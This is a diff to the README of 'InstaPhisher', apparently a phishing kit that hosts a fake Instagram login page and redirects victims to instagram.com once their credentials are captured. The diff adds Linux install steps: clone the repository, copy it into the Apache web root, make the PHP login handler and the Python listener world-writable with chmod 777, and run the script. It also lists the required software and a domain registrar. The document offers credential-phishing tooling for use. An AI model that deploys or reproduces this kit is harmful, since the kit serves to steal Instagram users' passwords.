@@ -1,6 +1,6 @@
 # InstaPhisher - 2020
 
-__author__ ExilasP
+__author__ ExilasP <br/>
 __version__ 1.0.0
 
 
@@ -22,28 +22,35 @@ Exemple:
 -   header("Location: https://www.instagram.com");
 -   header("Location: <redirection_url>");
 
+# Install
+
+### Linux
+
+```
+git-clone https://github.com/ExilasP/InstaPhisher.git
+cd InstaPhisher
+cp * -r '/var/www/html'
+cd /var/www/html
+sudo chmod +777 login.php && sudo chmod +777 InstaPhisher.py
+python InstaPhisher.py
+```
+
 
 # NOTICE
 
 ### Requirements
 
--   Python 
--   Apache
--	Php
--   DNS
+-   Python : https://www.python.org/downloads/
+-   Apache : https://httpd.apache.org/download.cgi
+-   Php    : https://www.php.net/downloads
+-   Mysql  : https://www.mysql.com/
+-   DNS    : https://www.freenom.com/
 
 ### Usage
 
-You must grant read and write permission to listner.py and login.php files with the command (for linux):
-``` 
-sudo chmod +777 login.php && sudo chmod +777 listner.py
-```
-
-Then, you can use python for start listner.
-
 Linux:
 ```
-python listner.py
+python InstaPhisher.py
 ```
 
 Windows:
